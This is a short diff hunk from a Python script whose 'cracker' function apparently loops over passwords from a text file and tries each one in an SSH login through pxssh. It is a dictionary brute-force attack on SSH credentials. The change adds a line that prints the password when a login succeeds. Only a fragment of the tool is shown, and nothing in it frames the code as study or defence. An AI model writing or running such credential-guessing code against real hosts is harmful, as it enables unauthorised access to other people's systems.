@@ -19,9 +19,11 @@ def cracker(user, ipAddress, txtFile ):
         print(secret)
         try:
             s.login(ipAddress, user, secret)
+            print("password found  " + secret )
         except pxssh.ExceptionPxssh as e:
             print ("pxssh failed to login")
             print(e)
+            
             
 def main():
     print("Shall we play a game?")
